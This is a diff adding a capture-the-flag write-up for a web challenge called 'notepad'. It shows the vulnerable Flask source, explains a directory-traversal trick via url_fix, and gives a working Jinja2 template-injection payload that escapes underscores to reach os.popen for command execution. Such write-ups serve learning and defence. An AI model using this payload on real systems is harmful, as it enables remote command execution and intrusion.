@@ -1,6 +1,60 @@
 WEB!
 
+
+Hard
+-
 <details><summary></summary></details>
+<details><summary>notepad</summary>
+File injection vulnerability 
+
+It checks for / and _ to prevent directory traversal and ssti 
+The /new endpoint is where the note taking happens, when user enters notes, it takes the first 128 characters of the note and append a unique ID to it, this will be the file name of the uploaded note.
+```
+from werkzeug.urls import url_fix
+from secrets import token_urlsafe
+from flask import Flask, request, render_template, redirect, url_for
+
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    return render_template("index.html", error=request.args.get("error"))
+
+@app.route("/new", methods=["POST"])
+def create():
+    content = request.form.get("content", "")
+    if "_" in content or "/" in content:
+        return redirect(url_for("index", error="bad_content"))
+    if len(content) > 512:
+        return redirect(url_for("index", error="long_content", len=len(content)))
+    name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
+    with open(name, "w") as f:
+        f.write(content)
+    return redirect(name)
+```
+
+
+url_fix appparently also changes \ into / which works perfect. 
+
+by taking advantage of the fact that the file is named after the first 128 charaters of the note, we fill the first section of the file with ```..\templates\error\``` followed by an army of ```ceresfauna``` until it reaches 128 characters, the ssti payload then goes behind it.  
+
+SSTI payload 
+```{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}```
+
+To then access the injected page, the name with the unique ID can be found in the url.  
+
+
+<img width="1918" height="261" alt="image" src="https://github.com/user-attachments/assets/4fa5d034-efdc-4a92-a34e-5365459f0998" />
+
+
+
+<img width="1918" height="261" alt="image" src="https://github.com/user-attachments/assets/9af31cb0-4163-4cb5-aa4a-10d3107c3451" />
+
+</details>
+
+Medium 
+-
+
 <details><summary>3v@l</summary>
 
 
